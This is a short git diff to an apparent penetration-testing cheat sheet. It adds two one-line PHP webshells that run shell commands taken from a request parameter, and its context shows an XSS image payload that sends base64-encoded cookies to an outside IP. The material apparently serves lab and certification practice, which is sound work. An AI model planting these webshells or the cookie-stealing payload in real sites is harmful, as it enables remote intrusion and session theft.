@@ -84,6 +84,20 @@ Cross Site scripting to dump base64 cookies. Make sure to url encode in burp wit
 ```
 <img src=x onerror=this.src='http://10.10.16.10/?cookies='+btoa(document.cookie) />
 ```
+### Webshells
+
+Reference: https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html
+
+Simple PHP webshell for command execution
+
+```
+<?php system($_REQUEST ['cmd']) ?>
+```
+
+```
+<?php system($_GET['cmd']); ?>
+```
+
 ### Pentesting SNMP
 
 Port 161 UDP
